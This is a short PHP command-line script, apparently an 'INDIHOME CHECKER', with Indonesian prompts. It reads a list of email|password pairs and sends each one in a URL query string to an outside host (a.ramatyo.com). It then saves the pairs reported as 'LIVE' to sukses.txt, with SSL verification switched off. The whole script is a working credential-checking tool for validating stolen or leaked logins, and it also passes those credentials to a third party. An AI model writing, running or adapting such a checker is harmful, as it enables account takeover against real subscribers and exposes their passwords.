 <?php

/**
 *  scode
**/

date_default_timezone_set("Asia/Jakarta");

class modules
{
    public function request($url, $param, $request = 'GET')
    {
        $ch = curl_init();
        $data = array(
                CURLOPT_URL             => $url,
                CURLOPT_POSTFIELDS      => $param,
                CURLOPT_CUSTOMREQUEST   => $request,
                CURLOPT_RETURNTRANSFER  => true,
                CURLOPT_FOLLOWLOCATION  => true,
                CURLOPT_SSL_VERIFYPEER  => false
            );
        curl_setopt_array($ch, $data);
        $execute = curl_exec($ch);
        curl_close($ch);
        return $execute;
    }

    public function getStr($page, $str1, $str2, $line_str2, $line)
    {
        $get = explode($str1, $page);
        $get2 = explode($str2, $get[$line_str2]);
        return $get2[$line];
    }

}

$modules = new modules();


print "\n INDIHOME CHECKER ".PHP_EOL;

awal:
echo "Input Empas (Email & Pass) : ";
@$fileakun = trim(fgets(STDIN));

if(empty(@file_get_contents($fileakun)))
{
    print PHP_EOL."File Empas Tidak Ditemukan.. Silahkan Input Ulang".PHP_EOL;
    goto awal;
}

print PHP_EOL."Total Ada : ".count(explode("\n", str_replace("\r","",@file_get_contents($fileakun))))." Akun, Lagi dicek babi";

while(true)
{
    echo PHP_EOL."Start Date : ".date("Y-m-d H:i:s");
    foreach(explode("\n", str_replace("\r", "", @file_get_contents($fileakun))) as $c => $akon)
    {
        $pecah = explode("|", trim($akon));
        $email = trim($pecah[0]);
        $password = trim($pecah[1]);

        $url = 'https://a.ramatyo.com/api/indi.php?empas='.$email.'|'.$password.'';

        $curl = $modules->request($url, null);
        print $curl.PHP_EOL;

        if(strpos($curl, "LIVE")){
            $h=fopen("sukses.txt","a");
            fwrite($h,$curl);
            fwrite($h,"\n");
            fclose($h);
        }



    }

    die();
    print PHP_EOL."SCODE";
}

?>
